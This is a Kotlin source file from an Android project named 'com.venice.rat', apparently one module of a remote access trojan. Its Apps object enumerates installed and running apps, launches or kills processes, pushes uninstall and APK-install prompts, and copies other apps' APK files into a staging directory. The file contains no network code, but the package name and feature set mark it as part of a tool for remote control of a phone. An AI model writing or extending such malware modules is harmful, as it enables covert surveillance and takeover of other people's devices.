package com.venice.rat.mod

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import androidx.core.content.FileProvider
import com.venice.rat.core.U
import java.io.File

@SuppressLint("QueryPermissionsNeeded")
object Apps {

    fun list(ctx: Context): String = buildString {
        ctx.packageManager.getInstalledPackages(0).sortedBy { it.packageName }.forEach { p ->
            val sys = (p.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            appendLine("${if (sys) "[S]" else "[U]"} ${p.packageName}")
        }
    }

    fun user(ctx: Context): String = buildString {
        ctx.packageManager.getInstalledPackages(0).forEach { p ->
            val sys = (p.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0
            if (!sys) appendLine("${p.packageName} | ${ctx.packageManager.getApplicationLabel(p.applicationInfo)}")
        }
    }.ifBlank { "no user apps" }

    fun launch(ctx: Context, pkg: String): Boolean = runCatching {
        val i = ctx.packageManager.getLaunchIntentForPackage(pkg) ?: return false
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        ctx.startActivity(i)
        true
    }.getOrDefault(false)

    fun kill(ctx: Context, pkg: String): Boolean = runCatching {
        (ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager)
            .killBackgroundProcesses(pkg)
        true
    }.getOrDefault(false)

    fun uninstall(ctx: Context, pkg: String) = runCatching {
        ctx.startActivity(Intent(Intent.ACTION_DELETE, Uri.parse("package:$pkg"))
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
    }

    fun install(ctx: Context, apk: File): Boolean = runCatching {
        val uri = FileProvider.getUriForFile(ctx, ctx.packageName + ".fp", apk)
        ctx.startActivity(Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION)
        })
        true
    }.getOrDefault(false)

    fun apkOf(ctx: Context, pkg: String): File? = runCatching {
        val ai = ctx.packageManager.getApplicationInfo(pkg, 0)
        val out = File(U.dir(ctx, "apk"), "${pkg}.apk")
        File(ai.sourceDir).copyTo(out, overwrite = true)
        out
    }.getOrNull()

    fun running(ctx: Context): String {
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        return buildString {
            @Suppress("DEPRECATION")
            am.getRunningAppProcesses()?.forEach { appendLine("${it.processName} (${it.pid})") }
        }.ifBlank { "n/a" }
    }
}
